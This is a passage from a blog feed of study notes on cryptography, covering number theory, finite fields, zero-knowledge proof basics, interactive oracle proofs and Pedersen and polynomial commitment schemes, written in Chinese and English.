- 知乎</a></li><li><a href="https://learnblockchain.cn/article/2096">区块链中的数学 -Pedersen 承诺 | 登链社区 | 区块链技术社区</a></li><li><ahref="https://crypto.stackexchange.com/questions/66973/pedersen-commitment-in-elliptic-curves">SecurityThought: Pedersen commitment in elliptic curves - Cryptography StackExchange</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> Cryptography </category>
          
          <category> zero-knowledge proof </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Interactive Oracle Proof (IOP)</title>
      <link href="/blog/2023/04/01/crypto/zk/10.iop_kzg/"/>
      <url>/blog/2023/04/01/crypto/zk/10.iop_kzg/</url>
      
        <content type="html"><![CDATA[<h1 id="interactive-oracle-proof-iop">Interactive Oracle Proof(IOP)</h1><h2 id="schwartz-zipple-lemma">Schwartz-Zipple lemma</h2><p>schwartz-zippel lemma state that a polynomial f(x) with degree <spanclass="math inline">\(d\)</span>. There are at most <spanclass="math inline">\(d\)</span> root making f(x)=0. Assume the domainof x is <span class="math inline">\(S\)</span>. The domain S is farbigger than <span class="math inline">\(d\)</span> numbers. Thus, <spanclass="math inline">\(Pr[f(x_0) = 0] \le frac{d}{S}\)</span> withrandomly sampled <span class="math inline">\(x_0\)</span>. TheSchwartz-Zippel lemma turns the problem of proof of knowledge into theproblem of proving the correctness of an evaluation of the polynomial ata random coordinate.</p><h2 id="iop-with-polynomial-commitment">IOP with polynomialcommitment</h2><p>The knowledge can be hidden as coefficients in a polynomial. Then,the zero proof of knowledge can be done by utilizing Schwartz-Zippellemma, which is called IOP protocol. The IOP protocol is idealizedbecause the randomness and the reveal of the evaluation cannot be easilyimplemented in the real world. Luckily, the polynomial commitment withhiding and binding properties can make it. The prover first commits thepolynomial to the verifier. With the binding property, the samecommitment cannot be made without the same polynomial. Then, theverifier randomly chooses a value <spanclass="math inline">\(x_0\)</span> and asks the prover to open thepolynomial commitment at point <span class="math inline">\(x_0\)</span>.With the hiding property, the knowledge of the polynomial can beprotected from leakage in the open stage. If the prover indeed providesa right value of <span class="math inline">\(f(x_0)\)</span>, it hasreason to believe that the prover indeed knows and commits the claimedf(x).</p><p>In summary, the process of the polynomial commitment-basedInteractive Proof of knowledge</p><ol type="1"><li>Alice hides the knowledge in the polynomial by arithmetization</li><li>Alice generates commitment <span class="math inline">\(C\)</span> byevaluating <span class="math inline">\(f(x)\)</span> at the secretcoordinate, and tell Bob</li><li>Bob randomly chooses <span class="math inline">\(x_0\)</span>, andtell Alice &lt;--- Fiat-Shamir Transform: <spanclass="math inline">\(x_0 = hash(C)\)</span></li><li>Alice claimed <span class="math inline">\(y_0\)</span> is theevaluation of <span class="math inline">\(f(x)\)</span> at <spanclass="math inline">\(x_0\)</span> and generates proof for Bob</li><li>Bob verify the proof with the commitment <spanclass="math inline">\(C\)</span>, <spanclass="math inline">\(x_0\)</span>, <spanclass="math inline">\(y_0\)</span></li></ol><p>TODO: -[ ] proof of knowledge vs zero-knowledge proof</p><h2 id="references">References</h2><ol type="1"><li><ahref="https://biquanlibai.notion.site/KZG-Commitment-1-Polynomial-Commitment-02f650f33ddf4765be92cf964ba0ee10">KZGCommitment 1: Polynomial Commitment</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> Cryptography </category>
          
          <category> zero-knowledge proof </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>数论基础</title>
      <link href="/blog/2023/03/30/crypto/math/2.numbers_basic/"/>
      <url>/blog/2023/03/30/crypto/math/2.numbers_basic/</url>
      
        <content type="html"><![CDATA[<h1 id="数论基础">2. 数论基础</h1><p>模算术（Modular Arithmetic）是数论的一个分支，a 与 b 模 n 同余：<spanclass="math inline">\(a \equiv b \mod n\)</span>,表示 a-b = kn, k为大于等于 1 的整数。 a 与 b 的关系称同余关系，n 叫做模数。</p><p><span class="math inline">\(a+b \equiv c \mod p\)</span>: 如果 a 和 b是任意的整数，p 是一个正整数，c 是一个非负整数，且 (a+b)÷p 的余数等于c÷p 的余数.</p><p>对于模数 n，与 a 同余的所有整数集合成为同余类 Congruence class，用<span class="math inline">\(\bar a_{n}\)</span> 表示。模数要是整数的原因是为了保证模运算的良好性质，如唯一性、封闭性、消去律等</p><h2 id="贝祖等式定理">贝祖等式/定理</h2><p>对于任意两个大于 1 的正整数 a 和b，<strong>它们的最大公约数（GCD）与最小公倍数（LCM）的乘积等于这两个数的乘积</strong>。即：<spanclass="math inline">\(GCD(a,b) * LCM (a,b) = a * b\)</span></p><h2 id="模算术的性质">模算术的性质</h2><p>模运算满足：反身性，对称性，传递性，加法性，减法性，乘法性，除法性，幂运算性</p><p>如果 a≡b (mod q) 且 c≡d (mod q)</p><ul><li>加法性：a+c≡b+d (mod q)</li><li>减法性：a-c≡b-d (mod q)</li><li>乘法性：a×c≡b×d (mod q)。</li><li>除法性：如果 a≡b(mod n) 且 c 和 n 互素，那么 a/c ≡ b/c(mod n)。</li><li>幂运算性：如果 a≡b(mod n)，那么对于任意的正整数 k，都有 <spanclass="math inline">\(a^k≡b^k(mod n)\)</span>。</li><li>消去律：如果 <span class="math inline">\(ac \equiv bc \mod n，c \ne0, and gcd(c,n) = 1\)</span>, 则有 <span class="math inline">\(a \equivb \mod n\)</span></li></ul><p>模运算的逆运算：找到一个整数 b，使得 <span class="math inline">\(ab\equiv 1 \mod n\)</span>，其中 a 和 n 是已知的整数。这个整 数 b 就叫做 a关于 n 的模逆元。</p><h2 id="剩余类-residue-class">剩余类 (Residue class)</h2><p>设 n &gt; 0, 对于每个整数 a， 定义：<span class="math inline">\([a] =\{x| x \equiv a \mod n\}\)</span>, [a] 是模 n 同余于 a 的所有整数的集合,称 [a] 为 a 模 n 的同余类, a 是 the class representative</p><blockquote><p>In other words, [𝑎] is the set of all integers that are congruent to𝑎 modulo n. We call [𝑎] the residue class of 𝑎 modulo 𝑚. The integer ais called the class representative.</p></blockquote><p>I/(n): 模 n 的所有同余类的集合，We denote the set of all residueclasses modulo n by I/(n). 例如: <span class="math inline">\(I/(4) = {[0]_4, [1]_4, [2]_4, [3]_4}\)</span> 和 <spanclass="math inline">\(I/(n) = { [0]_n, [1]_n, [2]_n, ...,[n-1]_n}\)</span></p><p>注意: I/(n) 是集合(同余类)的集合</p><p>简化剩余类(reduced residue class)是 m 的剩余系中与 m互素的数构成的子集</p><blockquote><p>Since we can’t cancel numbers that aren’t prime to the modulus, wesometimes want to omit these numbers from our complete residue system,and consider only representatives from the various congruence classesthat are relatively prime to m. This is called a <strong>reduced residuesystem</strong> mod m.</p></blockquote><h3 id="znz">Z/nZ</h3><p>The set of congruence classes mod n is called the set of <em>integersmodulo n</em>, and denoted Z/nZ.</p><p>Many authors write Zn for Z/nZ, but this conflicts with othernotation in number theory. (Some people just write Z/n.)</p><p>Warning: the elements of Z/nZ are congruence classes, not integers.Each element is a set of integers. For example, <spanclass="math inline">\(Z/4Z = \{[0]_4, [1]_4, [2]_4, [3]_4\}\)</span>.This is not a subset of Z.</p><h2 id="费马小定理">费马小定理</h2><p>假如 a 是一个整数 , p 是一个质数，且 gcd(a, p) = 1, 那么 <spanclass="math inline">\(a^{p-1} \equiv 1 \mod p\)</span></p><p>证明: 如果 p 为质数，那么一定有 residue class=<spanclass="math inline">\(\{[1]_p,[2]_p,[3]_p,[4]_p,[5]_p,…,[p-1]_p\}\)</span>，因为互质，所以需要p-1 步遍历所有的点，就是在 p-1 步的时候回到原位置，所以<spanclass="math inline">\(a^{p-1} \equiv 1 \mod p\)</span>。</p><h2 id="欧拉定理">欧拉定理</h2><p>对于正整数 n，欧拉函数（Euler's function）是小于 n 的正整数中与 n互质的数的个数。通常表示为 <spanclass="math inline">\(\varphi(n)\)</span>.其有对应的计算函数（复杂略过），三个常用性质：</p><ol type="1"><li>如果 n 为质数，<span class="math inline">\(\varphi(n) =n-1\)</span></li><li>如果 m, n 互质，则 <span class="math inline">\(\varphi(mn) =\varphi(m)\varphi(n)\)</span></li><li>如果 p 是一个质数，k 是大于等于 1 的正整数，则 <spanclass="math inline">\(\varphi(p^k) = p^{k-1}\varphi(p) =p^{k-1}*(p-1)\)</span></li></ol><h2 id="模-n-的本原根-prime-rootprimitive-rootprimitive-element">模 n的(本)原根 prime root、primitive root、primitive element</h2><p>a number g is a primitive root modulo n if every number a coprime ton is congruent to a power of g modulo n. In formula, <spanclass="math inline">\(m \equiv g^i mod n\)</span>, <spanclass="math inline">\(m \in \{m|gcd(m,n) = 1\}\)</span></p><p>对于模数 n 的每个互质数 a，都存在一个整数 k 满足：<spanclass="math inline">\(g^k \equiv a \mod n\)</span>, 称 g 为模 n的原根。g, as a primitive root modulo n, is also called the generator ofthe multiplicative group of integers modulo n.</p><p>不是每个数都有原根， 只有当 n 等于 2,4,p<sup>k,2p</sup>k, 其中 p为奇质数时，n 才有原根。所以对应群论，并不是所有的有限 n 阶群在模 n算数下都可以形成循环群。[^1]</p><p>对于 n 为素数的情况，For prime n, g is a primitive root of prime n ifand only if the results of g^i mod n is distinct and congruent to[1,n-1], which is congruent to n, i in [1, phi(n)=n-1]. that is <spanclass="math inline">\(g^1, g^2,...g^{n-1}\)</span> are distinct andequals to [1,n-1].</p><p>Why prime root is called generator？</p><p>The relevant (and cool) fact is this: if 𝑔 is a primitive root modulo𝑛 (so that 𝑔 has multiplicative order 𝜙(𝑛) modulo 𝑛), then every integerin the world that is relatively prime to 𝑛 is congruent modulo 𝑛 to somepower of 𝑔. In other words, the powers of 𝑔 "generate" the entire set ofreduced residue classes modulo 𝑛. (In terms of groups: themultiplicative group of reduced residue classes modulo 𝑛 is cyclic, and𝑔 is a generator for that cyclic group.)</p><p>原根生成了所有与 n互素的数的集合，也就是简化剩余类，简化剩余类的元素可以组成乘法群，从而原根就是生成元,而且是循环群的生成元，也就是可以通过原根一个元素生成整个循环群。</p><h2 id="群的生成元">群的生成元</h2><blockquote><p>a generating set of a group is a subset of the group set such thatevery element of the group can be expressed as a combination (under thegroup operation) of finitely many elements of the subset and theirinverses.</p></blockquote><p>Generating set of a group 生成元集合 (g_1,...,g_n)是群元素的集合，对于循环群来说，一个生成元便可生成整个群，该生成元即为模n的原根。对于其他非循环的有限群来说，存在生成元，但不存在可以单独生成整个群的一个生成元。通过生成元集合生成有限群。</p><blockquote><p>A set of generators (g_1,...,g_n) is a set of group elements that canbe used to generate all the elements in the group through repeatedapplication of the generators and their inverses. Cyclic groups can begenerated as powers of a single generator, but for all other groups,you'll need more than one generator.</p></blockquote><h1 id="参考资料">参考资料</h1><ol type="1"><li><ahref="https://chenliang.org/2021/02/25/foundations-of-number-theory/">密码学-01-数论基础· 陈亮的个人博客</a></li><li><ahref="https://math.libretexts.org/Bookshelves/Combinatorics_and_Discrete_Mathematics/Elementary_Number_Theory_%28Barrus_and_Clark%29/01%3A_Chapters/1.21%3A_Residue_Classes_and_the_Integers_Modelo_m">1.21:Residue Classes and the Integers Modelo m - MathematicsLibreTexts</a></li><li><ahref="https://courses.smp.uq.edu.au/MATH2301/Chapter2.pdf">Ghostscriptwrapper for C:and Settings.DOMATHSDropbox\2301\2010__2301.pdf</a></li><li><a href="https://solitaryroad.com/c304.html">Congruence, residueclasses of integers modulo m</a></li><li><a href="https://mathworld.wolfram.com/GroupGenerators.html">GroupGenerators -- from Wolfram MathWorld</a></li></ol><ul class="task-list"><li><label><input type="checkbox" />6. <ahref="https://www.youtube.com/watch?v=DKy98FWHwdg">Primitive Roots -YouTube</a></label></li></ul><ol start="7" type="1"><li>[^1]<ahref="http://ramanujan.math.trinity.edu/rdaileda/teach/f20/m3341/lectures/lecture16_slides.pdf">PrimitiveRoots Modulo Prime Powers</a></li><li><ahref="https://math.stackexchange.com/questions/2191852/why-are-primitive-roots-called-generators">elementarynumber theory - Why are primitive roots called generators? - MathematicsStack Exchange</a></li><li><ahref="https://math.berkeley.edu/~mcivor/math115su12/lectures/lecture5.pdf">berkeleymcivor's math lecture5.pdf</a></li><li><ahref="https://en.wikipedia.org/wiki/Generating_set_of_a_group">Generatingset of a group - Wikipedia</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> Cryptography </category>
          
          <category> math </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>4. 有限域运算以及代码理解</title>
      <link href="/blog/2023/03/30/crypto/math/4.%20finite_field_operations/"/>
      <url>/blog/2023/03/30/crypto/math/4.%20finite_field_operations/</url>
      
        <content type="html"><![CDATA[<h1 id="有限域运算以及代码理解">4. 有限域运算以及代码理解</h1><p>本文主要讲解有限域上的加减乘除以及有限域上多项式的加减乘除运算以及对应python 代码理解。</p><h2 id="有限域上的加法结构">有限域上的加法结构</h2><p>多项式除法 GF(2^8)主要看：<ahref="https://abcdxyzk.github.io/blog/2018/04/16/isal-erase-3/">伽罗华域（GaloisField）上的四则运算 - kk Blog —— 通用基础</a></p><p><ahref="https://github.com/Antalpha-Labs/zkp-co-learn/discussions/34">有限域下多项式计算的有关困惑· Antalpha-Labs/zkp-co-learn · Discussion #34</a></p><p>https://blog.csdn.net/suoluo_2020/article/details/119618283</p><p>GF(p^n)有三种表示形式，<ahref="https://zhuanlan.zhihu.com/p/161411524">信道编码系列(三)：伽罗华域(GaloisFields) - 知乎</a></p><p><span class="math inline">\(GF(p^n)\)</span>中的元素可以用多项式的形式表示，例如 GF(25) 中的元素可以用一个小于 5次的多项式表示，例如 x4 + x^3 + 11。GF(p^n)中的加法和减法都是按位异或，乘法和除法都是按照一个给定的素多项式来进行模运算123。GF(p^n)在密码学和纠错码中有重要的应用。</p><p>GF(p^n) 是 GF(p) 的扩域，GF(p)的元素都是整，从数扩展到多项式，构造一个代数结构满足域的性质，为满足域的性质，规定这些运算条件。</p><p>GF(p^n)，系数模 p, 因为系数模 p，所以多项式加法肯定还属于 GF(p^n)多项式乘法则有可能出现更高次项，所以模一个素多项式，因此结果也属于GF(p^n)</p><p>GF(2^p)的多项式模运算和 2.2 节中讲述的 GF(2)运算十分接近，只比其多了一条规则：多项式乘法得到的结果需要进行模 m(x)运算，这是为了将多项式的结果限制在集合 S中，下面用例子来介绍一下多项式模运算。</p><p>TODO</p><ul><li>[]</li></ul><h2 id="参考资料">参考资料</h2><ol type="1"><li><ahref="https://kyrita.top/number/math/%e6%9c%89%e9%99%90%e5%9f%9f-md/#">有限域-GaloisFields</a></li><li><a href="http://stuyang.com/blog/763a052576b9/">【密码学基础】05有限域 | Yang's blog</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> Cryptography </category>
          
          <category> math </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>零知识证明介绍</title>
      <link href="/blog/2023/03/30/crypto/zk/0.zk_intro2/"/>
      <url>/blog/2023/03/30/crypto/zk/0.zk_intro2/</url>
      
        <content type="html"><![CDATA[<h1 id="零知识证明">零知识证明</h1><p>·初始化算法：证明公钥+验证公钥-要证明的问题·证明算法：证明-证明公钥+证明公开数据+证明私有数据·验证算法：验证通过/不通过-验证公钥+证明公开数据+证明</p><h2 id="零知识证明的性能指标">零知识证明的性能指标</h2><p>·证明时间 ·验证时间：决定了链上执行的 gas 消耗·证明大小：决定了交易大小和链上消耗 ·安全假设·Zk-Snark：开发工具相对成熟，核心算法代码相对成熟，以太坊/Conflux主网有内置合约支持，证明长度小。需要 trusted setup，非量子安全。</p><h2 id="开发者需要做哪些部分">开发者需要做哪些部分</h2><figure><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/develop_zkp.png"alt="develop_zkp" /><figcaption aria-hidden="true">develop_zkp</figcaption></figure><h2 id="扩展材料">扩展材料</h2><p>零知识证明系统 https://zkp.science/</p><p>上层构建工具</p><ul><li>ZokRates https://zokrates.github.io/</li><li>Zinc https://github.com/matter-labs/zinc</li><li>Cairo（通用 cpu 电路） https://www.cairo-lang.org/</li></ul><p>底层库</p><ul><li>Libsnark:https://github.com/scipr-lab/libsnark</li></ul><p>研究问题 ·学术研究： ·如何设计更好的零知识证明系统？·如何实现零知识证明运算的安全外包？</p><p>工程研究： ·如何解决 zkRollup 中心化的问题？</p><p>零知识证明最大的局限性在于：</p><p>它要把所有的隐私拿在一方手中，让该方生成证明。对于数据挖掘的场景下，隐私是分散在各方的，那就不能直接运用零知识证明了。</p><h2 id="zkp-开发工具">zkp 开发工具</h2><figure><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/develop_tools.png"alt="develop_tools" /><figcaption aria-hidden="true">develop_tools</figcaption></figure>]]></content>
      
      
      <categories>
          
          <category> Cryptography </category>
          
          <category> zero-knowledge proof </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Introduction Zero Knowledge -- Alon Rosen</title>
      <link href="/blog/2023/03/30/crypto/zk/0.zk_intro3/"/>
      <url>/blog/2023/03/30/crypto/zk/0.zk_intro3/</url>
      
        <content type="html"><![CDATA[<h1 id="introduction-zero-knowledge----alon-rosen">Introduction ZeroKnowledge -- Alon Rosen</h1><h2 id="zero-knowledge-proofs">Zero-Knowledge Proofs</h2><p>It's mainly about the content of <ahref="https://www.youtube.com/watch?v=6uGimDYZPMw&amp;list=PL8Vt-7cSFnw29cLUVqAIuMlg1QJ-szV0K&amp;index=2">The9th BIU Winter School on Cryptography-Zero Knowledge</a> and someunderstanding of my own.</p><h2 id="what-is-zero-knowledge-good-for">What is zero knowledge goodfor</h2><p>Can prove that I know a secret without having to reveal it.</p><ol type="1"><li><p>Identification, Membership, Ownership and so on</p><p>A zero-knowledge identity proof is a term used to refer to anauthentication scheme where one party proves to the other to have aparticular piece of knowledge that proves ownership of theidentity.</p></li><li><p>Protocol Design</p><ol type="1"><li><p>Design against parties that <strong>follow instructions</strong>.(against 针对)</p><p>Secure against arbitrary deviation from the protocol.</p></li><li><p>Use ZK proof to <strong>force honest behavior</strong></p></li></ol></li></ol><p>Trusted Party, a general cryptography framework which is more generaleven than zero knowledge, can be turned into a cryptographic protocolusing zero-knowledge. Zero knowledge is what enables us to go<strong>from a setting which we trust into a setting in which we don'ttrust.</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">graph LR</span><br><span class="line">A[&quot;Trusted Party&quot;] --&quot;Zero-Knowledge Proof&quot;--&gt; B[&quot;Protocol&quot;]</span><br></pre></td></tr></table></figure><p>Note: Crypto is not just about zero knowledge. Zero-Knowledge is justa means to an end.</p><p>Weaker definitions are also useful. (WI/WH/NIZK)</p><h2 id="proof-systems">Proof Systems</h2><p>A proof is a method for establishing truth. what is the methoddepends on the context in which it's deployed, such as legal(truth isdetermined by a jury or by a judge), authoritative, scientific,philosophical, mathematical(Axiom -&gt;π-&gt;-&gt; Propositions).</p><p>Euclid put forward that inference should be cast in terms of axiomsand <em>rules of inference</em>. After that,</p><p>Two element have been added to the notion of proof:<strong>probabilistic and interactive</strong>. You are willing toaccept that small statement with the small probability of error and thenotion of interaction</p><h3 id="the-language-of-true-statements">The language of truestatements</h3><figure><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/image-20220416222657082.png"alt="image-20220416222657082" /><figcaption aria-hidden="true">image-20220416222657082</figcaption></figure><p>There is no prover here. To define a classic proof, you don't need totalk about prover at all and verifier is what matters. <strong>Theverifier is the most important entity</strong> in a proof and this isalso for people implementing a protocol. All that matters is what theverifier does at least for the soundness of proof.</p><h3 id="np-proof-system">NP Proof System</h3><p><ahref="https://blog.csdn.net/qq_21768483/article/details/80430590">P问题、NP 问题、NP 完全问题和 NP 难问题</a></p><p><ahref="https://sailist.github.io/AdAlgo/#%E5%9B%BE%E7%81%B5%E6%9C%BA%E4%B8%8Epnpnpc">高级算法P NP 图灵机与约化 | AdAlgo</a></p><figure><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/image-20220416222935487.png"alt="image-20220416222935487" /><figcaption aria-hidden="true">image-20220416222935487</figcaption></figure><p><strong>Boolean Satisfiability【布尔可满足性问题 SAT】</strong></p><p><strong>SAT 是一个 NPC 问题</strong>，每一个属于 NP 的都可以归纳到SAT 问题上。</p><figure><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/image-20220416224814534.png"alt="image-20220416224814534" /><figcaption aria-hidden="true">image-20220416224814534</figcaption></figure><p><strong>线性等式</strong>：P 问题，容易计算。Structured：是一个结构化的问题。</p><figure><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/image-20220416224928445.png"alt="image-20220416224928445" /><figcaption aria-hidden="true">image-20220416224928445</figcaption></figure><p>矩阵乘法 linear equations 是 P 问题，期最佳渐进复杂度为<spanclass="math inline">\(O(n^{2.373})\)</span>.<ahref="https://en.wikipedia.org/wiki/Matrix_multiplication_algorithm#:~:text=As%20of%20December%C2%A02020%2C%20the%20matrix%20multiplication%20algorithm%20with%20best%20asymptotic%20complexity%20runs%20in%20O(n2.3728596)%20time">wikipediareference</a></p><p><strong>the Class P：P 类问题</strong> poly-time(多项式时间) P类问题：在多项式时间下有解。 NP类问题：在多项式时间下不能确定能找到答案，但可验证。 NPC 类问题：NP类问题都可以归约到一个 NPC 类问题。</p><figure><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/image-20220416225029312.png"alt="image-20220416225029312" /><figcaption aria-hidden="true">image-20220416225029312</figcaption></figure><p><strong>二次剩余 Quadratic Residuosity</strong></p><p><ahref="https://www.youtube.com/watch?v=EJv4TiYP8-s&amp;list=PLXICrha0Si3oMaUzKeQVKAKc9u71Xdnsh">[QuadraticResidues] - What are Quadratic Residues? - YouTube</a></p><p>是一个 NP问题，在多项式时间内不一定能解出来，但是一定能在多项式时间内能验证。</p><figure><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/image-20220416225205379.png"alt="image-20220416225205379" /><figcaption aria-hidden="true">image-20220416225205379</figcaption></figure><p><strong>总结</strong> 有效的验证者 等价于多项式时间的验证者，下面说明如果是下面的问题，则都是可以在多项式时间下可验证的问题，即说明是有效的验证。</p><figure><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/image-20220416225306186.png"alt="image-20220416225306186" /><figcaption aria-hidden="true">image-20220416225306186</figcaption></figure><p><strong>证明非成员</strong></p><figure><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/image-20220416225429285.png"alt="image-20220416225429285" /><figcaption aria-hidden="true">image-20220416225429285</figcaption></figure><ol type="1"><li><p>对于 Linear Equation 是 P 问题，可以在多项式时间内确定。</p></li><li><p>对于 SAT 和二次剩余是 NP 问题，无法在多项式时间内确定。</p><p>最原始的证明就是：发送所有可能的 witness，逐个检查他是否满足 SAT 或QR。而二者的 witness 都是按指数增长的。所以 naive proof exponentiallylarge 按照指数增大。所以现在没有什么可以帮助你验证 non-membership 的statement 的。这便是 Shafi Goldwass 等人想法的来源。</p><p>他们在 GMR’85中提出了交互式证明，允许证明使用：随机性（概率容错）和交互（增加prover）</p></li></ol><h2 id="从-dapp-开发角度看">从 DAPP 开发角度看</h2><p>相关内容的公开资料很丰富，我 post 一些希望对你有帮助：</p><p>从需求出发如何根据不同 zk 技术的 tradeoffs 进行方案设计:</p><ol type="1"><li><p><ahref="https://www.youtube.com/watch?v=-PUKinjbLR8&amp;list=PLaM7G4Llrb7x5JgkfCN9kf7IB6QtomyCu&amp;index=24">ZKApplication Design Patterns | Devcon Bogotá</a></p></li><li><p><ahref="https://vitalik.ca/general/2022/06/15/using_snarks.html">从隐私保护的需求出发，如何把zkSnark fit into 现有应用</a></p></li><li><p>具体应用的交互建议看一些 zk dapp的源码以及在本地跑一跑客户端，这样会有更直观的理解：例如：https://github.com/vplasencia/zkSudoku</p></li></ol>]]></content>
      
      
      <categories>
          
          <category> Cryptography </category>
          
          <category> zero-knowledge proof </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Commitment and Overview of Modern SNARKs</title>
      <link href="/blog/2023/03/30/crypto/zk/9.commitments/"/>
      <url>/blog/2023/03/30/crypto/zk/9.commitments/</url>
      
        <content type="html"><![CDATA[<h1 id="commitment">Commitment</h1><p>Two security properties about commitment:</p><ul><li>Binding: Two different statements can't make the samecommitment</li><li>Hiding: Given a commitment, nothing is known about thestatement</li></ul><p>Commitment scheme 中的 Setup(<spanclass="math inline">\(1^\lambda\)</span>) 中 </p><p>In the context of a commitment scheme, Setup(<spanclass="math inline">\(1^\lambda\)</span>) refers to a probabilisticpolynomial-time (PPT) algorithm that takes a security parameter (inunary) and generates public parameters. The notation <spanclass="math inline">\(1^\lambda\)</span> means that the input to thealgorithm is a string of <span class="math inline">\(\lambda\)</span>ones, which is used as the security parameter.</p><p>In computer science, unary refers to a numeral system in which eachnatural number is represented by a corresponding number of 1s. Forexample, the number 3 would be represented as "111" in unary. Therefore,in the context of a security parameter, <spanclass="math inline">\(1^\lambda\)</span> means that the input to thealgorithm is a string of <span class="math inline">\(\lambda\)</span>ones. In the unary numeral system, the number 10 is represented by tenones: "1111111111".</p><p>PPT Algorithm stands for Probabilistic Polynomial-Time Algorithm. Itis an algorithm that runs in polynomial time but also has access to someoracle that provides true random bits12. The algorithm is used incryptography and is a type of randomized algorithm</p><h2 id="overview-of-modern-snarks">Overview of Modern SNARKs</h2><p>The modern SNARK has three gradients: <strong>arithmetization, IOPinteractive oracle proof, and a commitment scheme</strong>, which leadsto a non-interactive proof system. Arithmetization involves<strong>reducing</strong> the complexity of checking correctness into aless complex circuit satisfaction problem <strong>by making computationscompatible with IOP</strong>. IOP is an idealized protocol that involvesinteraction between the prover and verifier, where the verifier sends amessage and the prover responds with an oracle. The commitment schemecompiles the idealized protocol to a real-world realization usingcryptographic assumptions. Finally, a Fiat-Shamir transform is used toobtain a non-interactive proof by hashing the history of interactioninto a transcript and deriving randomness in a public way.</p><p>Arithmetization --&gt; IOP interactive oracle proof --compiled by--&gt; commitment scheme --&gt;a real-world proof system （anon-interactive proof）</p><ol type="1"><li><p>Arithmetization To make a real world program or computationcompatible with the IOP, we need to arithmetize it. we need to reducethe complexity of checking the correctness into a less complex circuitsatisfaction problem. We reduce the check to just a few probabilisticalgebraic checks.</p><p>The correctness of the computation or arbitrary computation isreduced by arithmetization to some circuit satisfaction problems. and wethen pick a suitable IOP to check the circuit satisfaction problem, andthen we instantiate the IOP using the cryptographic compiler to get aproof system.</p></li><li><p>The interactive oracle proof is an information-theoreticalobject. It makes some very idealized assumptions.</p><p>IOP describes a serious interaction between the prover and verifier.The verifier sends a message to the prover, and the prover responds withoracle, which looks like a locked box. The prover can read the wholemessage sent by the verifier, but the verifier can only have restrictedaccess to the prover's message that the verifier only read the prover'smessage using point queries that are randomized.</p><p>IOP is information-theoretic so that it makes Soundness and zkguarantees that hold against the computationally unbounded prover andverifier. It's an idealized protocol that holds against idealizedparties and adversaries.</p><p>A cryptographic primitive known as a commitment scheme is a way toimplement the physical boxes algorithmically. In other word, commitmentscheme compiles the IOP from an idealized protocol to a real-worldrealization</p><p>To realize or instantiate the idealized protocols, what we need is tointroduce certain cryptographic assumptions (for example, discrete logassumption, and collisions of the hash functions).</p><p>cryptographic compilers introduce a cryptographic assumption</p></li><li><p>In Practice, we then get a non-interactive proof by using aFiat-Shamir transform</p><p>what the transform does is that it hashes the history of theinteraction into a transcript, and uses the transcript the deriverandomness in a public way so that the prover cannot predict thechallenge picked by the verifier.</p></li></ol><h2 id="commitment-scheme">Commitment scheme</h2><ol type="1"><li>Setup(1^) -&gt; pp</li><li>Commit(pp; m) -&gt; (C; r)</li><li>Open(pp; C; m, r) -&gt; - 0\1</li></ol><h2 id="vector-commitments">Vector commitments</h2><h3 id="pederson-commitment">Pederson commitment</h3><p>The Pederson commitment scheme has hiding and binding propertiesbased on the discrete log hard problem. It works over a finite fieldwith prime order p, Fp.</p><p>The zero Knowledge property is not being cared about in the Pedersoncommitment.</p><ol type="1"><li><p>Setup(1^) -&gt; pp=[<span class="math inline">\(|G|_p\)</span>group with order p, <span class="math inline">\(G_1,G_2 \in G\)</span>],where <span class="math inline">\(G_1\)</span>, <spanclass="math inline">\(G_2\)</span> is two generator</p></li><li><p>Commit(pp; m) -&gt; (<spanclass="math inline">\(C=[m]G_1+[r]G_2\)</span>; r is random chosed fromFp) <span class="math inline">\([m]G_1\)</span> is the additivenotation, which means m times group operation of <spanclass="math inline">\(G_1\)</span>. It can also be seen as a sclar <spanclass="math inline">\(r\)</span> multiply the group element <spanclass="math inline">\(G_1\)</span>. The multiplicative notation, g^m,can also be seen in other place, which also means m times groupoperation of <span class="math inline">\(g\)</span></p></li><li><p>Open(pp; C; m, r) -&gt; - <span class="math inline">\(C ?=[m]G_1+[r]G_2\)</span></p><p>Normally, the open can be separated into two steps: Prove andVerify.</p><ol type="1"><li>Prove(pp, C, m, r) -&gt; <span class="math inline">\(\pi\)</span>,where the proof is (m, r) in the Pederson commitment. The proof will notreveal the m and r in the KZG commitment.</li><li>Verify(pp, C, <span class="math inline">\(\pi\)</span>) -&gt;0,1</li></ol></li></ol><p>Pedersen is a homomorphic commitment scheme (additive homomorphism)that is computationally hiding and binding. <spanclass="math inline">\(Commitment(m_1 ◦ m_2) = Commitment(m_1) ◦Commitment(m_2)\)</span></p><p>KZG10 is homomorphic polynomial commitments, but Merkle tree vectorcommitment is not one.</p><blockquote><p>Homomorphic commitments: we require our commitments to support anhomomorphic operation ◦. Requiring homomorphism rules out Merkle Treesas a solution. Homomorphic properties of commitments to “structuredobjects” have wide applications in cryptography (see, e.g., [KZG10] forhomomorphic polynomial commitments). The homomorphic property is anatural one and allows many useful applications ref: <ahref="https://eprint.iacr.org/2021/1678.pdf">Zero-Knowledge forHomomorphic Key-Value Commitments with Applications toPrivacy-Preserving Ledgers</a></p></blockquote><h3 id="vector-pederson-commitment">Vector Pederson 